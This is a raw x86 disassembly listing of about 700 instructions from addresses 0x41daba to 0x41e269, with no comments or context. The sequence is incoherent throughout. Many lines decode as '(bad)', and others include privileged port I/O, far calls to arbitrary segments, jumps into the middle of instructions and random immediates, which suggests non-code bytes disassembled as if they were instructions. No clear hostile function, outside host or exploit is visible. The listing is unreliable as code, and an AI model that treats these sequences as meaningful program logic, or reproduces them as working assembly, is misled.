  41daba:	inc    ebp
  41dabb:	cmp    eax,0xa3a63442
  41dac1:	and    DWORD PTR ds:0xa946d031,ecx
  41dac7:	adc    ah,BYTE PTR [ecx+0x6b]
  41daca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dacb:	ret    0xafa3
  41dace:	jbe    0x41da67
  41dad0:	inc    ebp
  41dad1:	dec    edx
  41dad2:	ins    DWORD PTR es:[edi],dx
  41dad3:	fstp   QWORD PTR [ebx]
  41dad5:	push   edi
  41dad6:	xchg   ebp,eax
  41dad7:	adc    BYTE PTR [edx+0x20],ch
  41dada:	nop
  41dadb:	into   
  41dadc:	leave  
  41dadd:	add    BYTE PTR ds:0xba764a9b,bl
  41dae3:	test   BYTE PTR [eax+0x29],ah
  41dae6:	aas    
  41dae7:	dec    edi
  41dae8:	lods   eax,DWORD PTR ds:[esi]
  41dae9:	adc    eax,0x97dfc7f2
  41daee:	xchg   DWORD PTR ds:0xbfff5440,esp
  41daf4:	jns    0x41dadd
  41daf6:	mov    ah,0xe6
  41daf8:	test   cl,ch
  41dafa:	or     edx,DWORD PTR [ecx-0x4fba4aa5]
  41db00:	jl     0x41db16
  41db02:	xchg   ecx,eax
  41db03:	outs   dx,DWORD PTR ds:[esi]
  41db04:	sub    DWORD PTR [ebx+esi*2+0x2c082ae6],0xe1ea42fa
  41db0f:	sub    ah,BYTE PTR [eax+ebp*8-0x69]
  41db13:	stos   BYTE PTR es:[edi],al
  41db14:	jbe    0x41dacb
  41db16:	sbb    bl,BYTE PTR [edx+0x49]
  41db19:	and    BYTE PTR [edx-0x18],bl
  41db1c:	mov    ecx,0x17d1283e
  41db21:	dec    esi
  41db22:	outs   dx,DWORD PTR ds:[esi]
  41db23:	jno    0x41db9f
  41db25:	adc    ebx,esi
  41db27:	stos   DWORD PTR es:[edi],eax
  41db28:	gs out 0x18,eax
  41db2b:	pop    ss
  41db2c:	push   ecx
  41db2d:	fsub   DWORD PTR [esi]
  41db2f:	scas   al,BYTE PTR es:[edi]
  41db30:	jo     0x41dbb1
  41db32:	add    cl,dh
  41db34:	lock add BYTE PTR [ecx+0x3688bc57],ch
  41db3b:	sbb    BYTE PTR [esi],al
  41db3d:	jl     0x41db72
  41db3f:	cld    
  41db40:	push   ebx
  41db41:	add    BYTE PTR [eax],0xe7
  41db44:	(bad)  
  41db45:	fsubr  DWORD PTR [ecx]
  41db47:	ss and eax,0xfd0816d7
  41db4d:	data16 ss test al,0x2e
  41db51:	sub    DWORD PTR [ecx-0x59],esp
  41db54:	pop    edi
  41db55:	xchg   DWORD PTR [edx],ebx
  41db57:	es (bad) 
  41db59:	sbb    DWORD PTR [eax-0x13f63427],edx
  41db5f:	inc    esi
  41db60:	mov    dh,0xff
  41db62:	mov    dh,0xf1
  41db64:	lods   al,BYTE PTR ds:[esi]
  41db65:	push   edx
  41db66:	ins    BYTE PTR es:[edi],dx
  41db67:	jg     0x41db63
  41db69:	adc    dl,BYTE PTR [edx+0x1a3b6f31]
  41db6f:	(bad)  
  41db70:	mov    al,0xb9
  41db72:	pushf  
  41db73:	std    
  41db74:	cmp    esi,DWORD PTR [edx]
  41db76:	dec    ebx
  41db77:	pshufw mm7,QWORD PTR [eax+0x60c715c5],0x64
  41db7f:	sub    BYTE PTR [ebp+0x46],ah
  41db82:	leave  
  41db83:	cli    
  41db84:	xlat   BYTE PTR ds:[ebx]
  41db85:	rcl    bh,0x37
  41db88:	cmp    eax,DWORD PTR [edx-0x35fe63c9]
  41db8e:	mov    fs,WORD PTR [ecx+0x61]
  41db91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db92:	dec    ecx
  41db93:	xchg   ebp,eax
  41db94:	jmp    0x1daac896
  41db99:	mov    dl,0xe3
  41db9b:	push   ecx
  41db9c:	pop    ds
  41db9d:	loop   0x41db8e
  41db9f:	mov    ebx,0x2d67b75
  41dba4:	inc    ecx
  41dba5:	or     al,0xab
  41dba7:	adc    edx,DWORD PTR [esi+0x25b5fb94]
  41dbad:	enter  0x9ff9,0xd2
  41dbb1:	jno    0x41db58
  41dbb3:	(bad)  
  41dbb4:	add    BYTE PTR [ecx],bh
  41dbb6:	mov    bl,0x37
  41dbb8:	hlt    
  41dbb9:	enter  0xd878,0x3e
  41dbbd:	add    eax,0x434d27e0
  41dbc2:	jle    0x41db78
  41dbc4:	clc    
  41dbc5:	push   0xfa77656e
  41dbca:	mov    al,es:0x8231d354
  41dbd0:	xor    ch,dh
  41dbd2:	pushf  
  41dbd3:	jecxz  0x41db64
  41dbd5:	popa   
  41dbd6:	test   cl,0xd8
  41dbd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbda:	or     DWORD PTR [edi-0x23],esp
  41dbdd:	in     al,0x1a
  41dbdf:	or     BYTE PTR ds:0xd78c9674,dh
  41dbe5:	sub    ebx,0xc3b7e2e6
  41dbeb:	std    
  41dbec:	push   edi
  41dbed:	inc    edx
  41dbee:	cmp    eax,0xbe10776b
  41dbf3:	dec    ebx
  41dbf4:	mov    al,ds:0xc834acc5
  41dbf9:	leave  
  41dbfa:	xor    al,0x33
  41dbfc:	shr    BYTE PTR [ecx-0x6072976d],cl
  41dc02:	sbb    al,0xb5
  41dc04:	push   eax
  41dc05:	mov    dl,0x3c
  41dc07:	(bad)  
  41dc08:	loop   0x41dbc2
  41dc0a:	lea    eax,[ebx+0x68]
  41dc0d:	loopne 0x41db9c
  41dc0f:	hlt    
  41dc10:	sub    edi,DWORD PTR [eax+edi*2+0xe6f1c36]
  41dc17:	jbe    0x41dbc2
  41dc19:	cmp    ch,BYTE PTR [ebp-0x78ccf10c]
  41dc1f:	sub    al,0xa3
  41dc21:	jecxz  0x41dbd5
  41dc23:	mov    edx,0xfd7a0867
  41dc28:	in     eax,0x26
  41dc2a:	jbe    0x41dc70
  41dc2c:	pop    edi
  41dc2d:	pop    esp
  41dc2e:	imul   ecx,esi,0x2d2bf455
  41dc34:	mov    esp,0x21f67c8e
  41dc39:	xor    BYTE PTR [ecx+0x2c6b938e],cl
  41dc3f:	mov    dl,BYTE PTR [ebp+0x35]
  41dc42:	retf   
  41dc43:	cmp    al,0x77
  41dc45:	outs   dx,DWORD PTR ds:[esi]
  41dc46:	scas   al,BYTE PTR es:[edi]
  41dc47:	in     eax,0x5c
  41dc49:	inc    eax
  41dc4a:	scas   al,BYTE PTR es:[edi]
  41dc4b:	xchg   ebx,eax
  41dc4c:	rcl    BYTE PTR [esi-0x21602984],cl
  41dc52:	pop    ebx
  41dc53:	into   
  41dc54:	push   esi
  41dc55:	mov    eax,ds:0x44b3b212
  41dc5a:	push   edx
  41dc5b:	rcl    DWORD PTR [edx],0x2a
  41dc5e:	pop    ebp
  41dc5f:	sbb    BYTE PTR [edi-0x7b],0xa7
  41dc63:	stc    
  41dc64:	mov    es,WORD PTR [esi+0x25]
  41dc67:	or     DWORD PTR [ebp+edx*8+0x4a6b1a30],edi
  41dc6e:	out    0x64,al
  41dc70:	and    eax,0x11b0d631
  41dc75:	push   esi
  41dc77:	mov    ?,WORD PTR [esi-0x4c19981f]
  41dc7d:	or     eax,0xd5cf479b
  41dc82:	sub    al,ah
  41dc84:	mov    edi,0x127a0876
  41dc89:	mov    ss,esi
  41dc8b:	xchg   ebp,eax
  41dc8c:	and    esp,DWORD PTR [ecx+edx*2+0x3678469]
  41dc93:	daa    
  41dc94:	sub    ah,bl
  41dc96:	bound  esp,QWORD PTR [ebx-0x38fc54d3]
  41dc9c:	jmp    0xaaabf779
  41dca1:	push   es
  41dca2:	dec    ebx
  41dca3:	daa    
  41dca4:	jae    0x41dce4
  41dca6:	jb     0x41dca0
  41dca8:	test   DWORD PTR [eax],eax
  41dcaa:	ins    BYTE PTR es:[edi],dx
  41dcab:	repnz das 
  41dcad:	and    ah,BYTE PTR [edi-0x60]
  41dcb0:	ficom  WORD PTR [ecx]
  41dcb2:	dec    edx
  41dcb3:	push   esp
  41dcb4:	push   0xc150f946
  41dcb9:	fbstp  TBYTE PTR [edi-0x1]
  41dcbc:	mov    eax,0x2576499e
  41dcc1:	add    DWORD PTR [esi+0x4136d7fb],0xffffffce
  41dcc8:	dec    BYTE PTR [ebx+0x50]
  41dccb:	mov    edi,0xb0e7455a
  41dcd0:	mov    ebp,0x9b8ad73e
  41dcd5:	add    bh,BYTE PTR [esp+ebx*1-0x194bbaaa]
  41dcdc:	push   cs
  41dcdd:	adc    DWORD PTR [eax+0x306bb918],eax
  41dce3:	xlat   BYTE PTR ds:[ebx]
  41dce4:	mov    edx,0x63cdab1
  41dce9:	inc    edi
  41dcea:	xchg   edx,eax
  41dceb:	mov    ebx,0xa064a185
  41dcf0:	push   es
  41dcf1:	in     eax,dx
  41dcf2:	cmp    eax,0xa2d80fe7
  41dcf7:	cmp    DWORD PTR [esi-0x1f],0x58
  41dcfb:	dec    ecx
  41dcfc:	loopne 0x41dc83
  41dcfe:	loopne 0x41dd2e
  41dd00:	fwait
  41dd01:	and    BYTE PTR ds:0x7eade8ba,bh
  41dd07:	adc    DWORD PTR [ebp-0x7ecf75e9],edx
  41dd0d:	popf   
  41dd0e:	ja     0x41dd47
  41dd10:	bound  edx,QWORD PTR [esi]
  41dd12:	sbb    DWORD PTR [edi-0x15b70b1b],0x5955efe1
  41dd1c:	cld    
  41dd1d:	ret    
  41dd1e:	mov    dh,0x26
  41dd20:	les    eax,FWORD PTR [ebx+0x162deed5]
  41dd26:	sbb    eax,ebx
  41dd28:	pushf  
  41dd29:	mov    edx,ecx
  41dd2b:	(bad)  ds:0xc147429f
  41dd31:	jecxz  0x41dd11
  41dd33:	test   BYTE PTR [di],dl
  41dd36:	add    eax,eax
  41dd38:	mov    ebx,0xab2d75cd
  41dd3d:	adc    BYTE PTR [edi-0x4f8137ba],0x72
  41dd44:	(bad)  
  41dd45:	mov    ebx,0xfe5ccb00
  41dd4a:	in     eax,0x19
  41dd4c:	jae    0x41dd09
  41dd4e:	rcr    WORD PTR [edi+0x38],0xff
  41dd53:	dec    esp
  41dd54:	out    0xce,eax
  41dd56:	xlat   BYTE PTR ds:[ebx]
  41dd57:	or     al,0xec
  41dd59:	sbb    BYTE PTR [ebx+0x497f7891],dh
  41dd5f:	push   ss
  41dd60:	cmp    al,0xf2
  41dd62:	xchg   DWORD PTR [eax-0x2c5b79fc],esi
  41dd68:	scas   eax,DWORD PTR es:[edi]
  41dd69:	push   es
  41dd6a:	mov    edi,0x8960aa5e
  41dd6f:	or     ebx,DWORD PTR [ecx-0x22448d6]
  41dd75:	push   0x51
  41dd77:	pop    ebp
  41dd78:	inc    esi
  41dd79:	inc    eax
  41dd7a:	pop    ds
  41dd7b:	mov    dl,BYTE PTR [ecx]
  41dd7d:	mov    ch,0x1e
  41dd7f:	jmp    0x41dd59
  41dd81:	repnz fs test al,0xe1
  41dd85:	xlat   BYTE PTR ds:[ebx]
  41dd86:	cmp    DWORD PTR [ebp-0x1b],0xb989a366
  41dd8d:	retf   0xba0b
  41dd90:	and    DWORD PTR [ebx-0xe4899b4],esp
  41dd96:	lock sub eax,0xe6ab12d1
  41dd9c:	push   ecx
  41dd9d:	mov    bl,0xaf
  41dd9f:	mov    al,ds:0xa55e013e
  41dda4:	iret   
  41dda5:	jle    0x41dd49
  41dda7:	jno    0x41dd56
  41dda9:	scas   eax,DWORD PTR es:[edi]
  41ddaa:	xchg   ebp,eax
  41ddab:	call   0xa5b6f8a3
  41ddb0:	inc    ecx
  41ddb1:	mov    ah,0xd9
  41ddb3:	xchg   ebx,eax
  41ddb4:	mov    ds:0xef95bf31,eax
  41ddb9:	add    bh,dh
  41ddbb:	fwait
  41ddbc:	int3   
  41ddbd:	test   eax,0x8fa8143d
  41ddc2:	ins    DWORD PTR es:[edi],dx
  41ddc3:	mov    al,0x7b
  41ddc5:	push   ebp
  41ddc6:	sub    ah,0x45
  41ddc9:	xchg   esp,eax
  41ddca:	rol    BYTE PTR [si+0x6354],0x27
  41ddd0:	adc    ebp,eax
  41ddd2:	inc    edx
  41ddd3:	push   esi
  41ddd4:	outs   dx,BYTE PTR ds:[esi]
  41ddd5:	pop    esp
  41ddd6:	mov    esp,0xf72caf89
  41dddb:	sub    BYTE PTR fs:[edi-0x1f01507d],bh
  41dde2:	jmp    0x6987ea5
  41dde7:	sbb    dl,BYTE PTR [edx+0x1d]
  41ddea:	jns    0x41dda5
  41ddec:	cmp    DWORD PTR [esi+0x7],0x11
  41ddf0:	or     al,0x8d
  41ddf2:	push   cs
  41ddf3:	ror    BYTE PTR [ecx+0x8],0x36
  41ddf7:	jo     0x41de6e
  41ddf9:	call   0xcb16:0x7cbd6161
  41de00:	and    eax,0x33fa74c0
  41de05:	int    0xe7
  41de07:	lea    esp,[eax-0x1f]
  41de0a:	inc    esi
  41de0b:	clc    
  41de0c:	and    ecx,DWORD PTR [eax+0x2e]
  41de0f:	dec    esi
  41de10:	ss push ds
  41de12:	fcom   QWORD PTR [esi]
  41de14:	loopne 0x41dde9
  41de16:	lods   eax,DWORD PTR ds:[esi]
  41de17:	cmp    eax,0x5ecf6fe2
  41de1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de1d:	(bad)  
  41de1e:	loop   0x41de02
  41de20:	cmp    eax,0x2c4b5844
  41de25:	mov    edx,0x74623619
  41de2a:	shl    DWORD PTR [edi+0x59],0xe7
  41de2e:	cmp    al,0x50
  41de30:	mov    WORD PTR [edx+0x23d43bda],?
  41de36:	stos   BYTE PTR es:[edi],al
  41de37:	and    esp,DWORD PTR ds:0x18c256f
  41de3d:	mov    dh,0xbc
  41de3f:	push   es
  41de40:	test   DWORD PTR [edi-0x3e],eax
  41de43:	dec    ebx
  41de44:	pushf  
  41de45:	stc    
  41de46:	in     al,0x3f
  41de48:	jl     0x41de8c
  41de4a:	jle    0x41deb3
  41de4c:	out    0xfd,eax
  41de4e:	cdq    
  41de4f:	dec    edi
  41de50:	pusha  
  41de51:	fsubr  DWORD PTR [ecx-0x1d]
  41de54:	mov    al,ds:0x94d388c5
  41de59:	sub    eax,0x880aab17
  41de5e:	cld    
  41de5f:	fdivrp st(0),st
  41de61:	repnz popf 
  41de63:	ret    
  41de64:	sbb    eax,0x47c49291
  41de69:	imul   edi,esp,0xcd196630
  41de6f:	or     al,0xab
  41de71:	sub    dl,ah
  41de73:	push   edi
  41de74:	ficom  WORD PTR [ebx-0x13]
  41de77:	ss stos DWORD PTR es:[edi],eax
  41de79:	dec    eax
  41de7a:	adc    al,BYTE PTR [eax-0x9]
  41de7d:	dec    ecx
  41de7e:	popa   
  41de7f:	xor    DWORD PTR [ebx],esi
  41de81:	sbb    esi,0xfffffff9
  41de84:	dec    esp
  41de85:	into   
  41de86:	push   0x4
  41de88:	mov    DWORD PTR [ebp-0x5f1feae7],eax
  41de8e:	push   ecx
  41de8f:	daa    
  41de90:	jns    0x41de6b
  41de92:	jg     0x41debd
  41de94:	inc    esi
  41de95:	rcr    eax,0x43
  41de98:	lea    esp,ds:0xc5ab4562
  41de9e:	sbb    al,0x39
  41dea0:	lock sub eax,0x95c4c8cb
  41dea6:	sti    
  41dea7:	jecxz  0x41de9e
  41dea9:	lss    esp,FWORD PTR [esi+edx*1+0x7f23e56c]
  41deb1:	mov    al,bh
  41deb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41deb4:	pop    esi
  41deb5:	(bad)  
  41deb6:	jns    0x41de5f
  41deb8:	push   edx
  41deb9:	jae    0x41df24
  41debb:	jp     0x41de8d
  41debd:	imul   ebx,DWORD PTR [esi],0x59
  41dec0:	xor    edi,ecx
  41dec2:	xchg   edi,eax
  41dec3:	xor    dl,BYTE PTR [edx]
  41dec5:	loope  0x41de49
  41dec7:	mov    ah,0xc7
  41dec9:	xor    BYTE PTR [ebx-0x24990141],0x44
  41ded0:	(bad)  
  41ded1:	push   esi
  41ded2:	dec    esi
  41ded3:	jecxz  0x41df4b
  41ded5:	add    eax,0x7caea968
  41deda:	outs   dx,BYTE PTR ds:[esi]
  41dedb:	addr16 cmc 
  41dedd:	add    BYTE PTR [eax],al
  41dedf:	add    BYTE PTR [eax],al
  41dee1:	add    cl,ah
  41dee3:	test   BYTE PTR [esi-0x80d1810],al
  41dee9:	xchg   ebp,eax
  41deea:	and    DWORD PTR [eax],eax
  41deec:	cmp    ebx,edx
  41deee:	adc    bh,ch
  41def0:	retf   
  41def1:	jno    0x41df0d
  41def3:	pop    edx
  41def4:	add    DWORD PTR [eax],eax
  41def6:	repz add al,0x0
  41def9:	add    BYTE PTR [esi+ebx*1-0x12afaed2],al
  41df00:	ror    ecx,0xf5
  41df03:	ret    
  41df04:	add    bh,BYTE PTR [esi-0x5a52f68e]
  41df0a:	retf   0x2400
  41df0d:	mov    ebp,0xc251776b
  41df12:	or     eax,0x41ae737e
  41df17:	inc    esi
  41df18:	mov    cl,0x70
  41df1a:	xor    BYTE PTR [ecx+0x48],ch
  41df1d:	sub    DWORD PTR [edi],ecx
  41df1f:	pop    esi
  41df20:	mov    WORD PTR [edi-0x5b],ds
  41df23:	xchg   al,ch
  41df25:	lods   eax,DWORD PTR ds:[esi]
  41df26:	or     ch,BYTE PTR [edi]
  41df28:	mov    ds:0x594246f4,al
  41df2d:	loope  0x41df21
  41df2f:	fcom   QWORD PTR [esi-0x5b50755d]
  41df35:	mov    bh,BYTE PTR [ecx+edx*4+0x752a809]
  41df3c:	jge    0x41df66
  41df3e:	ret    0xa210
  41df41:	add    BYTE PTR [ecx+0x7c],cl
  41df44:	test   BYTE PTR [edx],dl
  41df46:	dec    ebx
  41df47:	fadd   DWORD PTR [esi]
  41df49:	test   al,0x7c
  41df4b:	cdq    
  41df4c:	sbb    eax,0xeb2af23e
  41df51:	sub    DWORD PTR [ebx],ebp
  41df53:	fnstcw WORD PTR [ebp+ebp*8-0x70]
  41df57:	dec    edi
  41df58:	call   0x2dfff452
  41df5d:	pop    ebx
  41df5e:	arpl   WORD PTR [ebx+eax*1],bx
  41df61:	pushf  
  41df62:	adc    ch,dl
  41df64:	or     dl,cl
  41df66:	(bad)  
  41df67:	mov    eax,0x855c3c4f
  41df6c:	imul   edi,ebp,0xf445ddba
  41df72:	xchg   edx,eax
  41df73:	mov    ecx,0x1ee96807
  41df78:	lods   al,BYTE PTR ds:[esi]
  41df79:	mov    eax,ds:0x3928464c
  41df7e:	call   0x34dd:0x52b7056f
  41df85:	retf   
  41df86:	fsubr  QWORD PTR [esp+eiz*4-0x2864dd14]
  41df8d:	fs push ds
  41df8f:	lock sbb ebp,eax
  41df92:	cwde   
  41df93:	push   edi
  41df94:	jg     0x41df4a
  41df96:	cwde   
  41df97:	neg    BYTE PTR [edx+edi*2]
  41df9a:	in     al,dx
  41df9b:	mov    ds:0x7d49c3a7,al
  41dfa0:	add    esp,0x23ac85de
  41dfa6:	pop    esi
  41dfa7:	jl     0x41dfa2
  41dfa9:	cmp    ecx,DWORD PTR [ecx+0x6]
  41dfac:	or     ah,BYTE PTR [edi]
  41dfae:	xor    DWORD PTR [ecx-0x3c],esi
  41dfb1:	nop
  41dfb2:	nop
  41dfb3:	pop    esp
  41dfb4:	add    al,0xd
  41dfb6:	xor    eax,0xac01db94
  41dfbb:	pusha  
  41dfbc:	add    al,0x1b
  41dfbe:	lea    edi,[edi-0x2bb84d8a]
  41dfc4:	out    dx,al
  41dfc5:	push   edi
  41dfc6:	lods   al,BYTE PTR ds:[esi]
  41dfc7:	ins    DWORD PTR es:[edi],dx
  41dfc8:	lock jae 0x41dffb
  41dfcb:	pop    esp
  41dfcc:	sub    esi,DWORD PTR [edx+eax*4]
  41dfcf:	sub    BYTE PTR fs:[eax+0x26858745],dl
  41dfd6:	pop    ebp
  41dfd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfd8:	neg    DWORD PTR ds:0x6d2a672
  41dfde:	inc    ebx
  41dfdf:	js     0x41e047
  41dfe1:	mov    esp,0x84b77d88
  41dfe6:	imul   edi,DWORD PTR [eax+0x7d2d88d6],0xffffffe6
  41dfed:	inc    esi
  41dfee:	aam    0x81
  41dff0:	shl    DWORD PTR [esp+ebp*1-0x4aaddae7],0x20
  41dff8:	and    eax,0x21423149
  41dffd:	or     DWORD PTR [eax-0x4b],0xa625340d
  41e004:	pop    ebx
  41e005:	add    BYTE PTR [ecx],al
  41e007:	xor    al,0xf8
  41e009:	adc    edx,eax
  41e00b:	xor    esi,DWORD PTR [ebx+0x48b85c82]
  41e011:	adc    ebp,DWORD PTR [edx+0x4a]
  41e014:	jmp    esi
  41e016:	fmul   QWORD PTR [esi+0x30ae9ee6]
  41e01c:	sub    eax,0x896fdfcd
  41e021:	bnd jne 0x41e01e
  41e024:	push   0x5a582e57
  41e029:	idiv   BYTE PTR [edi-0x5d43b84a]
  41e02f:	jo     0x41e091
  41e031:	jnp    0x41e002
  41e033:	mov    fs,ebp
  41e035:	int    0xf3
  41e037:	popa   
  41e038:	out    0x4b,eax
  41e03a:	(bad)  
  41e03b:	stos   DWORD PTR es:[edi],eax
  41e03c:	fnstcw WORD PTR [eax]
  41e03e:	pop    eax
  41e03f:	ss out dx,al
  41e041:	shr    BYTE PTR [ebx+0x63b665de],cl
  41e047:	or     bl,dh
  41e049:	jl     0x41e0b0
  41e04b:	test   dl,dh
  41e04d:	xchg   ecx,eax
  41e04e:	mov    esp,0xba98984
  41e053:	mov    ebx,esi
  41e055:	cmp    DWORD PTR [esi],ebp
  41e057:	scas   al,BYTE PTR es:[edi]
  41e058:	mov    edi,0xaaef85e9
  41e05d:	inc    esp
  41e05e:	pop    ebx
  41e05f:	xchg   esi,eax
  41e060:	dec    ecx
  41e061:	xchg   DWORD PTR [ebp-0x52],edx
  41e064:	adc    al,0x7
  41e066:	sub    ecx,esp
  41e068:	jmp    0xd5d609ab
  41e06d:	inc    ebp
  41e06e:	mov    DWORD PTR [edx+edi*1+0x61053f28],esi
  41e075:	hlt    
  41e076:	xor    edi,DWORD PTR [edx-0x660872c7]
  41e07c:	push   ds
  41e07d:	push   0xffffffba
  41e07f:	jns    0x41e06e
  41e081:	out    dx,al
  41e082:	push   0xfffffff9
  41e084:	shl    DWORD PTR [ebp+ecx*1-0x2f],1
  41e088:	cmp    dh,cl
  41e08a:	jns    0x41e0c3
  41e08c:	push   es
  41e08d:	jb     0x41e095
  41e08f:	out    dx,eax
  41e090:	lahf   
  41e091:	fistp  QWORD PTR [eax-0x157bf8a9]
  41e097:	(bad)  
  41e099:	mov    ecx,0x49f02318
  41e09e:	loop   0x41e043
  41e0a0:	sub    esi,DWORD PTR [ecx+eiz*1-0x42baf540]
  41e0a7:	adc    ah,BYTE PTR [edx-0x6f6f90bd]
  41e0ad:	and    edi,ebx
  41e0af:	or     bl,BYTE PTR [esi-0x61]
  41e0b2:	dec    BYTE PTR [ecx]
  41e0b4:	mov    ds:0x6ffe3dc6,al
  41e0b9:	push   eax
  41e0ba:	push   edi
  41e0bb:	dec    edx
  41e0bc:	idiv   BYTE PTR [esi+0x63281a7b]
  41e0c2:	mov    ds:0x455a7007,eax
  41e0c7:	or     ch,BYTE PTR [edx+0x57]
  41e0ca:	test   eax,0x6a5ea018
  41e0cf:	test   al,0x45
  41e0d1:	mov    dh,0x7b
  41e0d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0d4:	push   eax
  41e0d5:	or     al,BYTE PTR [edi*1-0x53f3d0c0]
  41e0dc:	mov    dh,0xec
  41e0de:	mov    bl,0xb1
  41e0e0:	leave  
  41e0e1:	mov    edx,0x59aa7267
  41e0e6:	adc    dh,BYTE PTR [edx]
  41e0e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0e9:	jg     0x41e10f
  41e0eb:	mov    ebx,0xe6c7e6dd
  41e0f0:	ja     0x41e0ee
  41e0f2:	and    al,0x4
  41e0f4:	inc    ecx
  41e0f5:	aam    0xef
  41e0f7:	push   esi
  41e0f8:	fcmovnb st,st(2)
  41e0fa:	js     0x41e162
  41e0fc:	cmp    dl,BYTE PTR [eax+0x17]
  41e0ff:	pop    es
  41e100:	inc    edi
  41e101:	add    al,0x68
  41e103:	ror    ah,cl
  41e105:	add    al,BYTE PTR [esi-0x4f]
  41e108:	out    0x70,eax
  41e10a:	test   DWORD PTR [edx-0x42590a4c],esi
  41e110:	out    0x34,al
  41e112:	dec    edx
  41e113:	xor    BYTE PTR [eax-0x6ab6c39f],0xc0
  41e11a:	and    eax,0x9427d98c
  41e11f:	popa   
  41e120:	push   ebx
  41e121:	mov    ch,0xfd
  41e123:	imul   eax,DWORD PTR [ebx-0x56],0x41e3cca0
  41e12a:	addr16 in eax,dx
  41e12c:	cmc    
  41e12d:	mov    edi,0x663f2916
  41e132:	cmp    DWORD PTR [edx],ebp
  41e134:	add    al,0xb3
  41e136:	pop    esi
  41e137:	mov    cl,0x39
  41e139:	push   ds
  41e13a:	inc    eax
  41e13b:	dec    edi
  41e13c:	(bad)  
  41e13e:	clc    
  41e13f:	shl    BYTE PTR [edi-0x4be83315],1
  41e145:	sbb    eax,0x2dad5de7
  41e14a:	mov    edi,0x871cafdd
  41e14f:	inc    edi
  41e150:	add    ebx,DWORD PTR [edi]
  41e152:	nop
  41e153:	xor    eax,0xc5ac1120
  41e158:	pop    eax
  41e159:	xchg   dh,ch
  41e15b:	mov    dh,0xbc
  41e15d:	inc    edi
  41e15e:	pop    eax
  41e15f:	loopne 0x41e1be
  41e161:	cli    
  41e162:	das    
  41e163:	inc    esp
  41e164:	mov    DWORD PTR [ebx-0x7b587556],eax
  41e16a:	sub    BYTE PTR [ecx+0x74],ah
  41e16d:	clc    
  41e16e:	in     eax,0x11
  41e170:	bound  edi,QWORD PTR [edi]
  41e172:	xchg   ebx,eax
  41e173:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e174:	std    
  41e175:	mov    ebx,0x9ea009e9
  41e17a:	sub    al,0x8a
  41e17c:	(bad)  
  41e17d:	leave  
  41e17e:	mov    eax,0x399714c6
  41e183:	cmc    
  41e184:	inc    esi
  41e185:	int3   
  41e186:	adc    al,0xc7
  41e188:	and    al,0x82
  41e18a:	sbb    BYTE PTR [esi],ah
  41e18c:	sub    bh,BYTE PTR [edi]
  41e18e:	pop    ecx
  41e18f:	int    0xd1
  41e191:	mov    dl,0xd2
  41e193:	xlat   BYTE PTR fs:[ebx]
  41e195:	sahf   
  41e196:	pop    esp
  41e197:	ficom  DWORD PTR [edi-0x7f620d91]
  41e19d:	add    edi,DWORD PTR [edi-0x73]
  41e1a0:	mov    ds:0x507f9e06,eax
  41e1a5:	mov    al,ds:0xf2a5d95f
  41e1aa:	ins    DWORD PTR es:[edi],dx
  41e1ab:	test   eax,0x876c66f8
  41e1b1:	jecxz  0x41e210
  41e1b3:	push   ecx
  41e1b4:	jae    0x41e234
  41e1b6:	lea    esp,[esi]
  41e1b8:	xor    DWORD PTR [ebp+ebx*4-0x30],esp
  41e1bc:	mov    al,ds:0x2725fc16
  41e1c1:	addr16 sahf 
  41e1c3:	pushf  
  41e1c4:	mov    eax,0xfa8a53a
  41e1c9:	cmp    al,0x37
  41e1cb:	std    
  41e1cc:	jae    0x41e1c3
  41e1ce:	test   BYTE PTR [esi],0xee
  41e1d1:	jle    0x41e160
  41e1d3:	loope  0x41e1f7
  41e1d5:	out    dx,al
  41e1d6:	jge    0x41e1bb
  41e1d8:	dec    ebx
  41e1d9:	or     al,0x9c
  41e1db:	sub    eax,0xe35d8346
  41e1e0:	adc    al,0xda
  41e1e2:	xor    esp,esi
  41e1e4:	iret   
  41e1e5:	pop    ebx
  41e1e6:	xchg   ebx,eax
  41e1e7:	js     0x41e223
  41e1e9:	lds    esp,FWORD PTR [esi+edx*2]
  41e1ec:	mov    esi,0x83bd3a8f
  41e1f1:	dec    eax
  41e1f2:	lock sti 
  41e1f4:	nop
  41e1f5:	xchg   edi,eax
  41e1f6:	lods   al,BYTE PTR ds:[esi]
  41e1f7:	fucomip st,st(6)
  41e1f9:	cmp    ebp,ecx
  41e1fb:	ret    
  41e1fc:	cmc    
  41e1fd:	inc    esi
  41e1fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1ff:	frstor [ecx-0x5bc831fc]
  41e205:	or     eax,0xd4ee11c
  41e20a:	mov    ebx,0x90e8c21e
  41e20f:	(bad)  
  41e210:	je     0x41e1d1
  41e212:	into   
  41e213:	loope  0x41e261
  41e215:	push   esi
  41e216:	inc    DWORD PTR [esi+0x62]
  41e219:	jae    0x41e251
  41e21b:	adc    al,BYTE PTR [edx-0x6b]
  41e21e:	(bad)  [esi-0x317e1ed9]
  41e224:	sbb    al,0x90
  41e226:	loope  0x41e1fa
  41e228:	xchg   ebp,eax
  41e229:	xchg   edx,eax
  41e22a:	mov    ebx,cs
  41e22c:	xor    bl,BYTE PTR [ebx+0x7cd20810]
  41e232:	inc    ecx
  41e233:	in     eax,dx
  41e234:	adc    eax,0x62310547
  41e239:	pop    edi
  41e23a:	xchg   BYTE PTR [ebp-0x15],cl
  41e23d:	arpl   WORD PTR [edi+0x5c],di
  41e240:	std    
  41e241:	ss dec esi
  41e243:	test   DWORD PTR [edx+0x79794cde],ebx
  41e249:	out    0x61,eax
  41e24b:	dec    ebx
  41e24c:	mov    DWORD PTR [esi],0x6c0bd8ee
  41e252:	fmul   QWORD PTR [ebp-0x546aa552]
  41e258:	popa   
  41e259:	pop    eax
  41e25a:	popa   
  41e25b:	stos   BYTE PTR es:[edi],al
  41e25c:	fsub   QWORD PTR [ecx+0x5a]
  41e25f:	jbe    0x41e21a
  41e261:	ja     0x41e23f
  41e263:	xor    eax,esi
  41e265:	shl    eax,0x8b
  41e268:	cdq    
  41e269:	call   0xf806:0x467dfdf4
